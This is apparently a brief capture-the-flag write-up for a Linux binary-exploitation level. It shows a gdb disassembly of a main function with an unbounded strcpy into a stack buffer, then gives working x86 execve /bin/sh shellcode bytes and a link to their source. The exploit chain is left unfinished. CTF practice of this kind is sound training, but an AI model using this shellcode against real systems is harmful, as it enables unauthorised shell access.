# Level1 pwnage Linux level1 - Challenge 80

(gdb) disass main
Dump of assembler code for function main:
   0x0804841c <+0>:     push   %ebp
   0x0804841d <+1>:     mov    %esp,%ebp
   0x0804841f <+3>:     and    $0xfffffff0,%esp
   0x08048422 <+6>:     sub    $0x410,%esp
   0x08048428 <+12>:    mov    0xc(%ebp),%eax
   0x0804842b <+15>:    add    $0x4,%eax
   0x0804842e <+18>:    mov    (%eax),%eax
   0x08048430 <+20>:    mov    %eax,0x4(%esp)
   0x08048434 <+24>:    lea    0x10(%esp),%eax
   0x08048438 <+28>:    mov    %eax,(%esp)
   0x0804843b <+31>:    call   0x8048300 <strcpy@plt>
   0x08048440 <+36>:    mov    $0x0,%eax
   0x08048445 <+41>:    leave
   0x08048446 <+42>:    ret

Let's use this shellcode to spawn a shell:
http://shell-storm.org/shellcode/files/shellcode-827.php

Shellcode:
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
